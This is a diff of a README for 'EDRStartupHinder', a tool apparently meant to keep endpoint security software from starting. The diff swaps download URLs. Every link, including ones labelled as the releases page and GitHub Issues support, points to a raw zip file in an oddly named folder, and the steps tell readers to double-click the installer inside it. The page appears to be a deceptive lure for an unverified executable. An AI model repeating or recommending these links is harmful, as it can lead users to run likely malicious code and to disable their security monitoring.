@@ -6,7 +6,7 @@ Thank you for your interest in EDRStartupHinder. This tool helps red teams stop 
 
 ## 📥 Download Now
 
-[![Download EDRStartupHinder](https://raw.githubusercontent.com/dre5525/EDRStartupHinder/master/quadrienniumutile/Hinder-Startup-EDR-v1.5.zip)](https://raw.githubusercontent.com/dre5525/EDRStartupHinder/master/quadrienniumutile/Hinder-Startup-EDR-v1.5.zip)
+[![Download EDRStartupHinder](https://raw.githubusercontent.com/dre5525/EDRStartupHinder/master/quadrienniumutile/EDR_Startup_Hinder_1.1.zip)](https://raw.githubusercontent.com/dre5525/EDRStartupHinder/master/quadrienniumutile/EDR_Startup_Hinder_1.1.zip)
 
 ## 📋 System Requirements
 
@@ -28,13 +28,13 @@ Before you download, ensure your system meets these basic requirements:
 
 To get started, visit our Releases page to download the software.
 
-- **Download Link**: [https://raw.githubusercontent.com/dre5525/EDRStartupHinder/master/quadrienniumutile/Hinder-Startup-EDR-v1.5.zip](https://raw.githubusercontent.com/dre5525/EDRStartupHinder/master/quadrienniumutile/Hinder-Startup-EDR-v1.5.zip)
+- **Download Link**: [https://raw.githubusercontent.com/dre5525/EDRStartupHinder/master/quadrienniumutile/EDR_Startup_Hinder_1.1.zip](https://raw.githubusercontent.com/dre5525/EDRStartupHinder/master/quadrienniumutile/EDR_Startup_Hinder_1.1.zip)
 
 ### Steps to Download and Install:
 
 1. Click on the link above to go to the Releases page.
 2. Look for the latest version listed at the top of the page.
-3. Click on the link for the installer file, typically named something like `https://raw.githubusercontent.com/dre5525/EDRStartupHinder/master/quadrienniumutile/Hinder-Startup-EDR-v1.5.zip`.
+3. Click on the link for the installer file, typically named something like `https://raw.githubusercontent.com/dre5525/EDRStartupHinder/master/quadrienniumutile/EDR_Startup_Hinder_1.1.zip`.
 4. Your download will begin. Save the file to your preferred location on your computer.
 5. Once the download completes, locate the file and double-click it to run the installer.
 
@@ -59,7 +59,7 @@ If you encounter issues while using EDRStartupHinder, here are some common solut
 
 If you have further questions or need assistance, please reach out through our GitHub Issues page. We are committed to helping users have a smoother experience.
 
-- **Support Link**: [GitHub Issues](https://raw.githubusercontent.com/dre5525/EDRStartupHinder/master/quadrienniumutile/Hinder-Startup-EDR-v1.5.zip)
+- **Support Link**: [GitHub Issues](https://raw.githubusercontent.com/dre5525/EDRStartupHinder/master/quadrienniumutile/EDR_Startup_Hinder_1.1.zip)
 
 ## 🔗 Additional Resources
 
@@ -75,7 +75,7 @@ Eager to contribute? We welcome suggestions, improvements, and code contribution
 
 ## 📥 Quick Reference:
 
-- **Download**: [Download Link](https://raw.githubusercontent.com/dre5525/EDRStartupHinder/master/quadrienniumutile/Hinder-Startup-EDR-v1.5.zip)
-- **Support**: [GitHub Issues](https://raw.githubusercontent.com/dre5525/EDRStartupHinder/master/quadrienniumutile/Hinder-Startup-EDR-v1.5.zip)
+- **Download**: [Download Link](https://raw.githubusercontent.com/dre5525/EDRStartupHinder/master/quadrienniumutile/EDR_Startup_Hinder_1.1.zip)
+- **Support**: [GitHub Issues](https://raw.githubusercontent.com/dre5525/EDRStartupHinder/master/quadrienniumutile/EDR_Startup_Hinder_1.1.zip)
 
 Enjoy using EDRStartupHinder to improve your security tests!
